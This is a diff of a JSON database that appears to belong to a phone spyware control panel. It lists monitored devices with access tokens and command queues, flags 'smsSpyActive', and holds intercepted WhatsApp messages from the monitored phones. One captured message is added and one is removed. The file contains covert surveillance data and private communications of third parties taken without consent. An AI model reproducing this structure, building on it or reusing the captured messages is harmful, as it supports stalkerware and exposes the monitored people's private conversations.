@@ -4,7 +4,7 @@
     "deviceName": "HP-AIM-7C2F",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "5c459e8712f2a7ee2b4192ea89156763",
-    "lastSeen": 1775040808003,
+    "lastSeen": 1775040810912,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:32:40.020Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (12189 pesan): ~ p!nz",
+        "content": "ponakan nya ga kalah lucu kok",
+        "time": "01/04 18:53",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775040813675
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎GB ISIAN ZAYN X OWN [6] (95 pesan): ~ Langz own GB 7",
@@ -4011,14 +4019,6 @@
         "time": "01/04 18:36",
         "pkg": "com.whatsapp",
         "receivedAt": 1775039770127
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎7Sex Message (2 pesan): ~ Call Me Zal7Sex",
-        "content": "join live ku \n\nhttps://vt.tiktok.com/ZS98yFdDXbnt8-zv89N/",
-        "time": "01/04 18:36",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775039770125
       }
     ],
     "galleryPhotos": [],
@@ -4049,7 +4049,7 @@
     "deviceName": "HP-AIM-22BD",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "ee7716168abf03ae6470b12578967076",
-    "lastSeen": 1775040808607,
+    "lastSeen": 1775040811690,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:33:59.233Z",
